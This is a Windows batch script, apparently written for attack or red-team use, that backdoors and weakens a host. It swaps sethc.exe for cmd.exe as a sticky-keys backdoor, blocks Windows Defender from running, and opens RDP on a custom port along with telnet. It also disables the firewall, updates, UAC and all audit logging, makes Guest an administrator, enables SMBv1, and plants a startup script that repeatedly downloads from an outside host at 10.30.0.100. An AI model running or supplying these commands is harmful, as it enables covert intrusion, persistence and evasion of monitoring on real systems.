#Press shift 5 times
takeown /f c:\windows\system32\sethc.exe
icacls c:\windows\system32\sethc.exe /grant administrators:f
takeown /f c:\windows\system32\cmd.exe
icacls c:\windows\system32\cmd.exe /grant administrators:f
copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe

::Someone said this hurts defender
icacls %PROGRAMDATA%"\Microsoft\Windows Defender\Platform\*MsMpEng.exe" /deny SYSTEM:(RX) /T /C  /deny Administrators:(RX) /T /C /deny Users:(RX) /T /C
takeown /f "%PROGRAMDATA%\Microsoft\Windows Defender\Platform" /A /r /d y

::Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowTSConnections /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg ADD "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 6969 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

sc config tlntsvr start= auto
net start telnet

netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
netsh advfirewall firewall set multicastbroadcastresponse enable
netsh advfirewall firewall set multicastbroadcastresponse mode=enable profile=
reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile /V EnableFirewall /T REG_DWORD /D 0 /F 
reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\PrivateProfile /V EnableFirewall /T REG_DWORD /D 0 /F 
reg add HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile /V EnableFirewall /T REG_DWORD /D 0 /F 



sc config wuauserv start= disabled
net stop wuauserv
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU /v AUOptions /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 1 /f


net user Guest /active:yes
net user Guest SuperSecurePassword1! /ADD /Y & net localgroup administrators Guest /ADD & net localgroup "Remote Desktop Users" Guest /ADD 

REM Reset Account lockout counter after to 1 mins
net accounts /lockoutwindow:1

REM Lock Out Duration
net accounts /lockoutduration:1

REM Account Lock Out Number
net accounts /lockoutthreshold:999

REM Disable that pesky logs
auditpol /set /category:* /success:disable
auditpol /set /category:* /failure:disable

echo start /B powershell do { invoke-webrequest 10.30.0.100/351b -OutFile %USERPROFILE%\AppData\Local\Temp\Output ;echo check; sleep(15) } while (1) > C:\WINDOWS\System32\GroupPolicy\Machine\Scripts\Startup\batch.bat
C:\WINDOWS\System32\GroupPolicy\Machine\Scripts\Startup\batch.bat

REM disable UAC
reg ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

REM SMBv1 bestSMB
DISM /Online /Enable-Feature /All /FeatureName:SMB1Protocol